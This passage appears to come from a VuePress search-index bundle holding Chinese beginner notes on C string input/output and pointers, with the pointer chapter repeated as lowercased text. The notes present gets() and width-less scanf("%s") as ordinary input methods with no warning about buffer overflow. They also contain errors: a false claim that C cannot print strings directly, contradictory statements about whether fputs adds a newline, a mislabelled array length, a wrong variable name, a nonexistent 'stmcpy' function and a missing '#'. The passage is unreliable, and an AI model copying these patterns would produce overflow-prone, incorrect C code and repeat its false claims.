//定义一个长度为5的字符数组，并初始化\n    char arr4[] = "hello";\n\n    //访问数组元素\n    printf("%c\\n", arr2[0]);    //h\n    printf("%c\\n", arr2[1]);    //e\n    printf("%c\\n", arr2[2]);    //l\n    printf("%c\\n", arr2[3]);    //l\n    printf("%c\\n", arr2[4]);    //o\n\n    return 0;\n}\n\n\n\n# 字符串的输入输出\n\n> c语言中没有提供直接输出字符串的函数，需要使用循环来输出字符串。\n\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[] = "hello";\n\n    //输出字符串\n    for (int i = 0; i < 5; i++) {\n        printf("%c", arr[i]);\n    }\n    printf("\\n");\n\n    //输入字符串\n    for (int i = 0; i < 5; i++) {\n        scanf("%c", &arr[i]);\n    }\n    printf("%s\\n", arr);\n\n    return 0;\n}\n\n\n函数         说明                       参数                                                        返回值\ngets()     用来输入字符串，可以输入空格，以回车结束。    char *s ：指向用来存储输入字符串的数组。                                  char * ：返回输入的字符串。\nputs()     用来输出字符串，输出完毕后会自动换行。      char *s ：指向要输出的字符串。                                       int ：返回输出的字符个数。\nfgets()    用来输入字符串，可以输入空格，以回车结束。    char *s ：指向用来存储输入字符串的数组。 int n ：最多读取的字符个数。 file *stream   char * ：返回输入的字符串。\n                                    ：指向要读取的文件。\nfputs()    用来输出字符串，输出完毕后不会自动换行。     char *s ：指向要输出的字符串。 file *stream ：指向要写入的文件。               int ：返回输出的字符个数。\nscanf()    用来输入字符串，以空格、制表符、换行符结束。   char *format ：格式控制字符串。 ... ：要输入的字符串。                      int ：返回成功匹配并赋值的个数。\nstrlen()   用来计算字符串的长度，不包含 \\0 。      char *s ：指向要计算的字符串。                                       int ：返回字符串的长度。\n\n * gets()函数：用来输入字符串，可以输入空格，以回车结束。\n\ntip\n\n * gets()函数会自动在输入的字符串末尾添加\\0。\n * gets()函数会自动忽略回车键。\n\n * puts()函数：用来输出字符串，输出完毕后会自动换行。\n\ntip\n\n * puts()函数会自动在输出的字符串末尾添加\\n。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    gets(arr);\n    //输出字符串\n    puts(arr);\n\n    return 0;\n}\n\n\n * fgets()函数：用来输入字符串，可以输入空格，以回车结束。\n\ntip\n\n * fgets()函数会自动在输入的字符串末尾添加\\0。\n * fgets()函数会自动忽略回车键。\n\n * fputs()函数：用来输出字符串，输出完毕后不会自动换行。\n\ntip\n\n * fputs()函数会自动在输出的字符串末尾添加\\n。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    fgets(arr, 100, stdin);\n    //输出字符串\n    fputs(arr, stdout);\n\n    return 0;\n}\n\n\n * scanf()函数：用来输入字符串，以空格、制表符、换行符结束。\n\ntip\n\n * scanf()函数会自动在输入的字符串末尾添加\\0。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    scanf("%s", arr);\n    //输出字符串\n    printf("%s\\n", arr);\n\n    return 0;\n}\n\n\n * strlen()函数：用来计算字符串的长度，不包含 \\0 。\n\ntip\n\n * strlen()函数不会自动在输入的字符串末尾添加\\0。\n\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[] = "hello";\n\n    printf("%d\\n", strlen(arr));\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 字符串添加\n\n  #include <stdio.h>\n\n  int main() {\n\n      char arr[100] = "hello";\n\n      //输入字符串\n      scanf("%s", arr);\n      //输出字符串\n      printf("%s\\n", arr);\n\n      return 0;\n  }\n',charsets:{cjk:!0}},{title:"概述",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/05-%E6%8C%87%E9%92%88.html",relativePath:"数据结构/C语言程序设计/05-指针.md",key:"v-5ed3d4da",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/05-%E6%8C%87%E9%92%88.html",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:2},{level:3,title:"内存",slug:"内存",normalizedTitle:"内存",charIndex:9},{level:3,title:"物理存储器和存储地址空间",slug:"物理存储器和存储地址空间",normalizedTitle:"物理存储器和存储地址空间",charIndex:164},{level:3,title:"内存地址",slug:"内存地址",normalizedTitle:"内存地址",charIndex:273},{level:3,title:"指针和指针变量",slug:"指针和指针变量",normalizedTitle:"指针和指针变量",charIndex:380},{level:2,title:"指针的定义和使用",slug:"指针的定义和使用",normalizedTitle:"指针的定义和使用",charIndex:425},{level:3,title:"指针的定义",slug:"指针的定义",normalizedTitle:"指针的定义",charIndex:425},{level:3,title:"指针间接修改变量的值",slug:"指针间接修改变量的值",normalizedTitle:"指针间接修改变量的值",charIndex:895},{level:3,title:"指针的大小",slug:"指针的大小",normalizedTitle:"指针的大小",charIndex:1119},{level:3,title:"野指针和空指针",slug:"野指针和空指针",normalizedTitle:"野指针和空指针",charIndex:1413},{level:3,title:"万能指针 void *",slug:"万能指针-void",normalizedTitle:"万能指针 void *",charIndex:1727},{level:3,title:"const 修饰指针变量",slug:"const-修饰指针变量",normalizedTitle:"const 修饰指针变量",charIndex:2030},{level:2,title:"指针和数组",slug:"指针和数组",normalizedTitle:"指针和数组",charIndex:2456},{level:3,title:"数组名和指针",slug:"数组名和指针",normalizedTitle:"数组名和指针",charIndex:2466},{level:3,title:"指针操作数组",slug:"指针操作数组",normalizedTitle:"指针操作数组",charIndex:3206},{level:3,title:"指针加减运算",slug:"指针加减运算",normalizedTitle:"指针加减运算",charIndex:3611},{level:3,title:"指针数组",slug:"指针数组",normalizedTitle:"指针数组",charIndex:4392},{level:2,title:"多级指针",slug:"多级指针",normalizedTitle:"多级指针",charIndex:4708},{level:2,title:"指针和函数",slug:"指针和函数",normalizedTitle:"指针和函数",charIndex:5371},{level:3,title:"函数形参改变实参的值",slug:"函数形参改变实参的值",normalizedTitle:"函数形参改变实参的值",charIndex:5381},{level:3,title:"函数返回指针",slug:"函数返回指针",normalizedTitle:"函数返回指针",charIndex:5840},{level:3,title:"函数指针",slug:"函数指针",normalizedTitle:"函数指针",charIndex:6131},{level:2,title:"指针和字符串",slug:"指针和字符串",normalizedTitle:"指针和字符串",charIndex:6397},{level:3,title:"字符指针",slug:"字符指针",normalizedTitle:"字符指针",charIndex:6408},{level:3,title:"字符指针做函数参数",slug:"字符指针做函数参数",normalizedTitle:"字符指针做函数参数",charIndex:6576},{level:3,title:"const 修饰的指针变量",slug:"const-修饰的指针变量",normalizedTitle:"const 修饰的指针变量",charIndex:6831},{level:3,title:"指针数组做为main函数的参数",slug:"指针数组做为main函数的参数",normalizedTitle:"指针数组做为main函数的参数",charIndex:7183},{level:3,title:"字符串处理函数",slug:"字符串处理函数",normalizedTitle:"字符串处理函数",charIndex:7486}],headersStr:"概述 内存 物理存储器和存储地址空间 内存地址 指针和指针变量 指针的定义和使用 指针的定义 指针间接修改变量的值 指针的大小 野指针和空指针 万能指针 void * const 修饰指针变量 指针和数组 数组名和指针 指针操作数组 指针加减运算 指针数组 多级指针 指针和函数 函数形参改变实参的值 函数返回指针 函数指针 指针和字符串 字符指针 字符指针做函数参数 const 修饰的指针变量 指针数组做为main函数的参数 字符串处理函数",content:'# 概述\n\n\n# 内存\n\n * 存储器：计算机的组成中，用来存储数据和程序的部件\n * 内存：内部存储器，暂存程序和数据\n * 外村：外部存储器，用来长期存储程序和数据\n\n内存是沟通CPU和外部存储器的桥梁，CPU通过内存来访问外部存储器\n\n * 暂存放CPU要处理的数据和程序\n * 暂存与硬盘等外部存储器交换的数据\n\n\n# 物理存储器和存储地址空间\n\n * 物理存储器：内存条，内存条上的每一个存储单元都有一个唯一的编号，称为物理地址\n\n * 存储地址空间：内存条上所有存储单元的集合，每一个存储单元都有一个唯一的编号，称为存储地址\n\n\n# 内存地址\n\n * 将内存抽象成一个很大的数组，每个元素都有一个唯一的编号，称为内存地址\n * 内存地址是一个无符号整数，用16进制表示\n * 内存地址的范围：0x00000000 ~ 0xFFFFFFFF\n\n\n# 指针和指针变量\n\n * 指针：内存地址的别名\n * 指针变量：存储内存地址的变量\n\n\n# 指针的定义和使用\n\n\n# 指针的定义\n\n * 指针变量的定义：数据类型 *指针变量名;\n * 指针变量的初始化：指针变量名 = &变量名;\n * 指针变量的使用：*指针变量名\n * *操作符操作的是指针变量指向的内存空间\n\ninclude <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n\n    printf("a的地址为：%p\\n", &a); //打印变量a的地址\n\n    printf("p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("p的地址为：%p\\n", &p); //打印指针变量p的地址\n\n    printf("*p的值为：%d\\n", *p); //打印指针变量p指向的内存空间的值\n\n    return 0;\n}\n\n\n\n# 指针间接修改变量的值\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    *p = 20; //通过指针间接修改变量a的值\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n\n    return 0;\n}\n\n\n\n# 指针的大小\n\n * 指针变量的大小与操作系统有关\n   \n   * 32位操作系统：4个字节\n   * 64位操作系统：8个字节\n\n * sizeof(指针变量名)可以获取指针变量的大小\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    printf("指针变量p的大小为：%lu\\n", sizeof(p)); //打印指针变量p的大小\n\n    return 0;\n}\n\n\n\n# 野指针和空指针\n\n * 野指针：指针变量指向非法的内存空间\n * 空指针：指针变量指向内存编号为0的空间，空指针不指向任何合法的内存空间\n\nWARNING\n\n * 空指针不是野指针\n * 空指针指向的内存空间是不可以访问的\n * 空指针不指向任何合法的内存空间\n\n#include <stdio.h>\n\nint main() {\n\n    int *p = NULL; //定义一个空指针\n\n    printf("空指针p的值为：%p\\n", p); //打印空指针p的值\n\n    printf("空指针p的大小为：%lu\\n", sizeof(p)); //打印空指针p的大小\n\n    return 0;\n}\n\n\n\n# 万能指针 void *\n\n> void * 是一种特殊的指针类型，可以用来存放任意类型的地址\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p = &a; //定义一个指针变量p，指向变量a\n\n    void *p1 = &a; //定义一个万能指针p1，指向变量a\n\n    printf("指针变量p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("万能指针p1的值为：%p\\n", p1); //打印万能指针p1的值\n\n    return 0;\n}\n\n\n\n# const 修饰指针变量\n\n * const 修饰指针变量，表示指针变量指向的内存空间的值不能修改\n\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int b = 20; //定义一个变量b，值为20\n\n    int *const p = &a; //定义一个指针变量p，指向变量a\n\n    printf("指针变量p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("指针变量p指向的值为：%d\\n", *p); //打印指针变量p指向的值\n\n    //p = &b; //err, 指针变量p的值不能修改\n\n    *p = 30; //ok, 指针变量p指向的值可以修改\n\n    printf("指针变量p指向的值为：%d\\n", *p); //打印指针变量p指向的值\n\n    return 0;\n}\n\n\n\n# 指针和数组\n\n\n# 数组名和指针\n\n * 数组名：数组首元素的地址\n * 指针变量：指向数组首元素的指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n\n    printf("数组arr的地址为：%p\\n", arr); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[0]); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", arr + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[0] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[1]); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[1] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", arr[1] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", *(arr + 1)); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", *arr + 1); //打印数组arr的地址\n\n    return 0;\n}\n\n\n\n# 指针操作数组\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n    int i = 0;\n    for (i = 0; i < 5; i++) {\n        printf("%d\\n", *(arr + i));\n    }\n    printf("arr[0]的地址为：%p\\n", &arr[0]); //打印数组arr的地址\n\n    int *p = arr; //定义一个指针变量p，指向数组arr\n    for (i = 0; i < 5; i++) {\n        printf("%d\\n", *(p + i));\n    }\n\n    for (i = 0; i < 5; i++) {\n        p[i] = 2 * i;\n    }\n\n}\n\n\n\n\n# 指针加减运算\n\n * 指针加减整数：指针向前或向后移动指定的元素个数\n * 指针加减指针：两个指针相减，得到的是两个指针之间的元素个数\n\n#include <stdio.h>\n\nint main(){\n\n    int a;\n    int *p = &a;\n    int *p1 = p + 1;\n    printf("p的值为：%p\\n", p);\n    printf("p1的值为：%p\\n", p1);\n    printf("p1 - p的值为：%ld\\n", p1 - p);\n\n    char b=0;\n    char *p2 = &b;\n    char *p3 = p2 + 1;\n    printf("p2的值为：%p\\n", p2);\n    printf("p3的值为：%p\\n", p3);\n    printf("p3 - p2的值为：%ld\\n", p3 - p2);\n\n}\n\n\n\n通过改变指针指向操作数组元素：\n\n#include <stdio.h>\n\nint main(){\n\n    \n        int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n        int *p = arr; //定义一个指针变量p，指向数组arr\n        int i = 0;\n        for (i = 0; i < 5; i++) {\n            printf("%d\\n", *(p + i));\n        }\n    \n        p = &arr[4];\n        for (i = 0; i < 5; i++) {\n            printf("%d\\n", *(p - i));\n        }\n    \n}\n\n\n\n\n# 指针数组\n\n> 指针数组：数组中存放的是指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n    int b = 20; //定义一个变量b，值为20\n    int c = 30; //定义一个变量c，值为30\n\n    int *arr[3] = {&a, &b, &c}; //定义一个指针数组arr，存放指针变量\n\n    int i = 0;\n    for (i = 0; i < 3; i++) {\n        printf("%d\\n", *(arr[i]));\n    }\n\n    return 0;\n}\n\n\n\n# 多级指针\n\n * C语言允许有多级指针存在, 在实际的程序中一级指针最常用，其次是二级指针。\n * 一级指针：指向变量的指针\n * 二级指针：指向一级指针的指针\n * 三级指针：指向二级指针的指针\n\n#include <stdio.h>\n\nint main(){\n\n    int a = 10; //定义一个变量a，值为10\n    int *p = &a; //定义一个指针变量p，指向变量a\n    int **p1 = &p; //定义一个二级指针变量p1，指向指针变量p\n    int ***p2 = &p1; //定义一个三级指针变量p2，指向二级指针变量p1\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n    printf("a的地址为：%p\\n", &a); //打印变量a的地址\n    printf("p的值为：%p\\n", p); //打印指针变量p的值\n    printf("p的地址为：%p\\n", &p); //打印指针变量p的地址\n    printf("p1的值为：%p\\n", p1); //打印二级指针变量p1的值\n    printf("p1的地址为：%p\\n", &p1); //打印二级指针变量p1的地址\n    printf("p2的值为：%p\\n", p2); //打印三级指针变量p2的值\n    printf("p2的地址为：%p\\n", &p2); //打印三级指针变量p2的地址\n    \n    return 0;\n}\n\n\n\n# 指针和函数\n\n\n# 函数形参改变实参的值\n\n#include <stdio.h>\n\nvoid swap(int a, int b) {\n    int temp = a;\n    a = b;\n    b = temp;\n}\n\nvoid swap1(int *a, int *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    swap(a, b);\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    swap1(&a, &b);\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    return 0;\n}\n\n\n\n# 函数返回指针\n\n#include <stdio.h>\n\nint *getMax(int *a, int *b) {\n    if (*a > *b) {\n        return a;\n    } else {\n        return b;\n    }\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    int *p = getMax(&a, &b);\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%d\\n", *p);\n\n    return 0;\n}\n\n\n\n# 函数指针\n\n * 函数指针：指向函数的指针变量\n\n#include <stdio.h>\n\nint getMax(int a, int b) {\n    return a > b ? a : b;\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    int (*p)(int, int) = getMax;\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%d\\n", p(a, b));\n\n    return 0;\n}\n\n\n\n# 指针和字符串\n\n\n# 字符指针\n\n * 字符指针：指向字符串的指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n\n    return 0;\n}\n\n\n\n# 字符指针做函数参数\n\n#include <stdio.h>\n\nvoid printStr(char *p) {\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n}\n\nint main() {\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n\n    printStr(p);\n\n    return 0;\n}\n\n\n\n# const 修饰的指针变量\n\n * const 修饰的指针变量，指针变量指向的内存空间的值不能修改\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void){\n\n    const char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n\n    printf("p的值为：%s\\n", p);\n\n    //p[0] = \'H\'; //err, 指针变量p指向的内存空间的值不能修改\n\n    p = "hello world"; //ok, 指针变量p指向的内存空间的值可以修改\n\n    printf("p的值为：%p\\n", p);\n}\n\n\n\n\n# 指针数组做为main函数的参数\n\n> main 函数是操作系统调用的，第一个参数是 argc ，第二个参数是 argv ， argv 是一个指针数组，数组中的每一个元素都是一个指针，指向一个字符串\n\n#include <stdio.h>\n\nint main(int argc, char *argv[]){\n\n    char*a[]={ "hello", "world", "!" };\n    int i;\n\n    for (i = 0; i < argc; i++) {\n        printf("%s\\n", argv[i]);\n    }\n\n    return 0;\n\n}\n\n\n\n\n# 字符串处理函数\n\n函数名        功能                   参数                                         返回值      头文件\nstrlen     计算字符串的长度             const char *str                            size_t   string.h\nstrcpy     复制字符串                char *dest, const char *src                char *   string.h\nstrcat     字符串拼接                char *dest, const char *src                char *   string.h\nstrcmp     字符串比较                const char *str1, const char *str2         int      string.h\nstrchr     查找字符在字符串中第一次出现的位置    const char *str, int c                     char *   string.h\nstrstr     查找字符串在字符串中第一次出现的位置   const char *haystack, const char *needle   char *   string.h\nstrtok     分割字符串                char *str, const char *delim               char *   string.h\nstrerror   根据错误编号获取错误信息         int errnum                                 char *   string.h\nstmcpy     复制字符串                char *dest, const char *src, size_t n      char *   string.h\nstrncpy    复制字符串                char *dest, const char *src, size_t n      char *   string.h\n\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void){\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n\n    printf("p的值为：%s\\n", p);\n\n    //p[0] = \'H\'; //err, 指针变量p指向的内存空间的值不能修改\n\n    p = "hello world"; //ok, 指针变量p指向的内存空间的值可以修改\n\n    printf("p的值为：%p\\n", p);\n}\n\n',normalizedContent:'# 概述\n\n\n# 内存\n\n * 存储器：计算机的组成中，用来存储数据和程序的部件\n * 内存：内部存储器，暂存程序和数据\n * 外村：外部存储器，用来长期存储程序和数据\n\n内存是沟通cpu和外部存储器的桥梁，cpu通过内存来访问外部存储器\n\n * 暂存放cpu要处理的数据和程序\n * 暂存与硬盘等外部存储器交换的数据\n\n\n# 物理存储器和存储地址空间\n\n * 物理存储器：内存条，内存条上的每一个存储单元都有一个唯一的编号，称为物理地址\n\n * 存储地址空间：内存条上所有存储单元的集合，每一个存储单元都有一个唯一的编号，称为存储地址\n\n\n# 内存地址\n\n * 将内存抽象成一个很大的数组，每个元素都有一个唯一的编号，称为内存地址\n * 内存地址是一个无符号整数，用16进制表示\n * 内存地址的范围：0x00000000 ~ 0xffffffff\n\n\n# 指针和指针变量\n\n * 指针：内存地址的别名\n * 指针变量：存储内存地址的变量\n\n\n# 指针的定义和使用\n\n\n# 指针的定义\n\n * 指针变量的定义：数据类型 *指针变量名;\n * 指针变量的初始化：指针变量名 = &变量名;\n * 指针变量的使用：*指针变量名\n * *操作符操作的是指针变量指向的内存空间\n\ninclude <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n\n    printf("a的地址为：%p\\n", &a); //打印变量a的地址\n\n    printf("p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("p的地址为：%p\\n", &p); //打印指针变量p的地址\n\n    printf("*p的值为：%d\\n", *p); //打印指针变量p指向的内存空间的值\n\n    return 0;\n}\n\n\n\n# 指针间接修改变量的值\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    *p = 20; //通过指针间接修改变量a的值\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n\n    return 0;\n}\n\n\n\n# 指针的大小\n\n * 指针变量的大小与操作系统有关\n   \n   * 32位操作系统：4个字节\n   * 64位操作系统：8个字节\n\n * sizeof(指针变量名)可以获取指针变量的大小\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p; //定义一个指针变量p\n\n    p = &a; //将变量a的地址赋值给指针变量p\n\n    printf("指针变量p的大小为：%lu\\n", sizeof(p)); //打印指针变量p的大小\n\n    return 0;\n}\n\n\n\n# 野指针和空指针\n\n * 野指针：指针变量指向非法的内存空间\n * 空指针：指针变量指向内存编号为0的空间，空指针不指向任何合法的内存空间\n\nwarning\n\n * 空指针不是野指针\n * 空指针指向的内存空间是不可以访问的\n * 空指针不指向任何合法的内存空间\n\n#include <stdio.h>\n\nint main() {\n\n    int *p = null; //定义一个空指针\n\n    printf("空指针p的值为：%p\\n", p); //打印空指针p的值\n\n    printf("空指针p的大小为：%lu\\n", sizeof(p)); //打印空指针p的大小\n\n    return 0;\n}\n\n\n\n# 万能指针 void *\n\n> void * 是一种特殊的指针类型，可以用来存放任意类型的地址\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int *p = &a; //定义一个指针变量p，指向变量a\n\n    void *p1 = &a; //定义一个万能指针p1，指向变量a\n\n    printf("指针变量p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("万能指针p1的值为：%p\\n", p1); //打印万能指针p1的值\n\n    return 0;\n}\n\n\n\n# const 修饰指针变量\n\n * const 修饰指针变量，表示指针变量指向的内存空间的值不能修改\n\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n\n    int b = 20; //定义一个变量b，值为20\n\n    int *const p = &a; //定义一个指针变量p，指向变量a\n\n    printf("指针变量p的值为：%p\\n", p); //打印指针变量p的值\n\n    printf("指针变量p指向的值为：%d\\n", *p); //打印指针变量p指向的值\n\n    //p = &b; //err, 指针变量p的值不能修改\n\n    *p = 30; //ok, 指针变量p指向的值可以修改\n\n    printf("指针变量p指向的值为：%d\\n", *p); //打印指针变量p指向的值\n\n    return 0;\n}\n\n\n\n# 指针和数组\n\n\n# 数组名和指针\n\n * 数组名：数组首元素的地址\n * 指针变量：指向数组首元素的指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n\n    printf("数组arr的地址为：%p\\n", arr); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[0]); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", arr + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[0] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[1]); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", &arr[1] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", arr[1] + 1); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", *(arr + 1)); //打印数组arr的地址\n\n    printf("数组arr的地址为：%p\\n", *arr + 1); //打印数组arr的地址\n\n    return 0;\n}\n\n\n\n# 指针操作数组\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n    int i = 0;\n    for (i = 0; i < 5; i++) {\n        printf("%d\\n", *(arr + i));\n    }\n    printf("arr[0]的地址为：%p\\n", &arr[0]); //打印数组arr的地址\n\n    int *p = arr; //定义一个指针变量p，指向数组arr\n    for (i = 0; i < 5; i++) {\n        printf("%d\\n", *(p + i));\n    }\n\n    for (i = 0; i < 5; i++) {\n        p[i] = 2 * i;\n    }\n\n}\n\n\n\n\n# 指针加减运算\n\n * 指针加减整数：指针向前或向后移动指定的元素个数\n * 指针加减指针：两个指针相减，得到的是两个指针之间的元素个数\n\n#include <stdio.h>\n\nint main(){\n\n    int a;\n    int *p = &a;\n    int *p1 = p + 1;\n    printf("p的值为：%p\\n", p);\n    printf("p1的值为：%p\\n", p1);\n    printf("p1 - p的值为：%ld\\n", p1 - p);\n\n    char b=0;\n    char *p2 = &b;\n    char *p3 = p2 + 1;\n    printf("p2的值为：%p\\n", p2);\n    printf("p3的值为：%p\\n", p3);\n    printf("p3 - p2的值为：%ld\\n", p3 - p2);\n\n}\n\n\n\n通过改变指针指向操作数组元素：\n\n#include <stdio.h>\n\nint main(){\n\n    \n        int arr[5] = {1, 2, 3, 4, 5}; //定义一个数组arr\n        int *p = arr; //定义一个指针变量p，指向数组arr\n        int i = 0;\n        for (i = 0; i < 5; i++) {\n            printf("%d\\n", *(p + i));\n        }\n    \n        p = &arr[4];\n        for (i = 0; i < 5; i++) {\n            printf("%d\\n", *(p - i));\n        }\n    \n}\n\n\n\n\n# 指针数组\n\n> 指针数组：数组中存放的是指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10; //定义一个变量a，值为10\n    int b = 20; //定义一个变量b，值为20\n    int c = 30; //定义一个变量c，值为30\n\n    int *arr[3] = {&a, &b, &c}; //定义一个指针数组arr，存放指针变量\n\n    int i = 0;\n    for (i = 0; i < 3; i++) {\n        printf("%d\\n", *(arr[i]));\n    }\n\n    return 0;\n}\n\n\n\n# 多级指针\n\n * c语言允许有多级指针存在, 在实际的程序中一级指针最常用，其次是二级指针。\n * 一级指针：指向变量的指针\n * 二级指针：指向一级指针的指针\n * 三级指针：指向二级指针的指针\n\n#include <stdio.h>\n\nint main(){\n\n    int a = 10; //定义一个变量a，值为10\n    int *p = &a; //定义一个指针变量p，指向变量a\n    int **p1 = &p; //定义一个二级指针变量p1，指向指针变量p\n    int ***p2 = &p1; //定义一个三级指针变量p2，指向二级指针变量p1\n\n    printf("a的值为：%d\\n", a); //打印变量a的值\n    printf("a的地址为：%p\\n", &a); //打印变量a的地址\n    printf("p的值为：%p\\n", p); //打印指针变量p的值\n    printf("p的地址为：%p\\n", &p); //打印指针变量p的地址\n    printf("p1的值为：%p\\n", p1); //打印二级指针变量p1的值\n    printf("p1的地址为：%p\\n", &p1); //打印二级指针变量p1的地址\n    printf("p2的值为：%p\\n", p2); //打印三级指针变量p2的值\n    printf("p2的地址为：%p\\n", &p2); //打印三级指针变量p2的地址\n    \n    return 0;\n}\n\n\n\n# 指针和函数\n\n\n# 函数形参改变实参的值\n\n#include <stdio.h>\n\nvoid swap(int a, int b) {\n    int temp = a;\n    a = b;\n    b = temp;\n}\n\nvoid swap1(int *a, int *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    swap(a, b);\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    swap1(&a, &b);\n\n    printf("a的值为：%d\\n", a);\n    printf("b的值为：%d\\n", b);\n\n    return 0;\n}\n\n\n\n# 函数返回指针\n\n#include <stdio.h>\n\nint *getmax(int *a, int *b) {\n    if (*a > *b) {\n        return a;\n    } else {\n        return b;\n    }\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    int *p = getmax(&a, &b);\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%d\\n", *p);\n\n    return 0;\n}\n\n\n\n# 函数指针\n\n * 函数指针：指向函数的指针变量\n\n#include <stdio.h>\n\nint getmax(int a, int b) {\n    return a > b ? a : b;\n}\n\nint main() {\n\n    int a = 10;\n    int b = 20;\n\n    int (*p)(int, int) = getmax;\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%d\\n", p(a, b));\n\n    return 0;\n}\n\n\n\n# 指针和字符串\n\n\n# 